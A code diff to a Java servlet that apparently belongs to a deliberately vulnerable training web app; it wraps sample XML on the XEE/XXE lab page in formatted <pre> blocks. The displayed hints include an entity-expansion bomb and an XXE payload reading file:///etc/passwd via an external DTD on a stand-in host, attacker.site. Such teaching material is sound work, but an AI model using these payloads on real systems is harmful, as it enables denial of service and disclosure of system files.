@@ -55,6 +55,7 @@ public class XEEandXXEServlet extends HttpServlet {
         }
         bodyHtml.append(MessageUtils.getMsg("msg.add.users.by.xml", locale));
         bodyHtml.append("<br><br>");
+        bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
         bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
         bodyHtml.append(ESAPI.encoder().encodeForHTML("<users ou=\"ou=people,dc=t246osslab,dc=org\" >") + "<br>");
         bodyHtml.append(TAB + ESAPI.encoder()
@@ -62,7 +63,8 @@ public class XEEandXXEServlet extends HttpServlet {
         bodyHtml.append(TAB + ESAPI.encoder()
                 .encodeForHTML("<user uid=\"user02\" phone=\"090-9876-5432\" mail=\"user02@example.com\">") + "<br>");
         bodyHtml.append(ESAPI.encoder().encodeForHTML("</users>"));
-        bodyHtml.append("<br><br>");
+        bodyHtml.append("</pre>");
+        bodyHtml.append("<br>");
         bodyHtml.append("<input type=\"file\" name=\"file\" size=\"60\" /><br>");
         bodyHtml.append(MessageUtils.getMsg("msg.select.upload.file", locale));
         bodyHtml.append("<br><br>");
@@ -75,6 +77,7 @@ public class XEEandXXEServlet extends HttpServlet {
         if ("/xee".equals(req.getServletPath())) {
             bodyHtml.append(MessageUtils.getMsg("msg.note.xee", locale));
             bodyHtml.append("<br><br>");
+            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
             bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\" encoding=\"UTF-8\" ?>") + "<br>");
             bodyHtml.append(ESAPI.encoder().encodeForHTML("<!DOCTYPE s[") + "<br>");
             bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY x0 \"ha!\">") + "<br>");
@@ -95,21 +98,26 @@ public class XEEandXXEServlet extends HttpServlet {
             bodyHtml.append(TAB + TAB + ESAPI.encoder().encodeForHTML("</ns1:reverse>") + "<br>");
             bodyHtml.append(TAB + ESAPI.encoder().encodeForHTML("</soapenv:Body>") + "<br>");
             bodyHtml.append(ESAPI.encoder().encodeForHTML("</soapenv:Envelope>") + "<br>");
+            bodyHtml.append("</pre>");
         } else {
             bodyHtml.append(MessageUtils.getMsg("msg.note.xxe.step1", locale));
             bodyHtml.append("<br><br>");
+            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
             bodyHtml.append(ESAPI.encoder().encodeForHTML("<!ENTITY % p1 SYSTEM \"file:///etc/passwd\">") + "<br>");
             bodyHtml.append(
                     ESAPI.encoder().encodeForHTML("<!ENTITY % p2 \"<!ATTLIST users ou CDATA '%p1;'>\">") + "<br>");
             bodyHtml.append(ESAPI.encoder().encodeForHTML("%p2;"));
-            bodyHtml.append("<br><br>");
+            bodyHtml.append("</pre>");
+            bodyHtml.append("<br>");
             bodyHtml.append(MessageUtils.getMsg("msg.note.xxe.step2", locale));
             bodyHtml.append("<br><br>");
+            bodyHtml.append("<pre id=\"code\" class=\"prettyprint lang-xml\">");
             bodyHtml.append(ESAPI.encoder().encodeForHTML("<?xml version=\"1.0\"?>") + "<br>");
             bodyHtml.append(
                     ESAPI.encoder().encodeForHTML("<!DOCTYPE users SYSTEM \"http://attacker.site/vulnerable.dtd\" >")
                             + "<br>");
             bodyHtml.append(ESAPI.encoder().encodeForHTML("<users />"));
+            bodyHtml.append("</pre>");
         }
         bodyHtml.append("</form>");
         HTTPResponseCreator.createSimpleResponse(res, MessageUtils.getMsg("title.xxe", locale), bodyHtml.toString());
